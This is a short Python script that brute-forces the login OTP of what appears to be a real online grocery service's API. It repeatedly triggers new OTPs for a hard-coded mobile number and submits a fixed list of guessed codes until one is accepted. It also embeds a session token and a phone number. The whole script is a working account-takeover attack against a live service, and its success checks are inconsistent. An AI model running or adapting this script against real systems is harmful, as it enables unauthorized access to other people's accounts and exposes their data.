import requests
from bs4 import BeautifulSoup as BS
import json

def generateotp():
    otp_found = 0
    while otp_found == 0:
            Endpoint = "https://api.starquik.com/v3/users/login"
            #Generate new OTP Post data to be sent
            payload = {"uemail":"","password":"","umobile":"8104648488","quote_id":""}
            headers = {"temptoken": "8fa1db6aa4652f6124062f9ca1d2c5b1a6da199f", "Connection": "close"}
            #Generating New OTP 
            r = requests.post(url = Endpoint, data=json.dumps(payload), headers=headers)
            soup = BS(r.text, "html.parser")
            p_dict = json.loads(str(soup).strip())
            print(p_dict)
            otp = ["8216", "1001", "1334", "1003", "4035"]
            for i in range (0, 5):
                print(otp[i])
                endpoint = "https://api.starquik.com/v3/users/login"
                headers = {"temptoken": "8fa1db6aa4652f6124062f9ca1d2c5b1a6da199f", "Connection": "close"}
                payload = {"uemail":"","password":"","umobile":"8104648488","otp":"1","otp_v":otp[i],"quote_id":""}
                r = requests.post(url = endpoint, data=json.dumps(payload), headers=headers)    
                soup = BS(r.text, "html.parser")
                p_dict = json.loads(str(soup).strip())
                print(p_dict)
                if p_dict["flag"] == "0":
                     print("incorrect otp")
                     continue
                elif p_dict["flag"] == 1:
                     print("OTP Found!")
                     print(otp[i])
                     otp_found = 1
                     exit()
                     
generateotp()

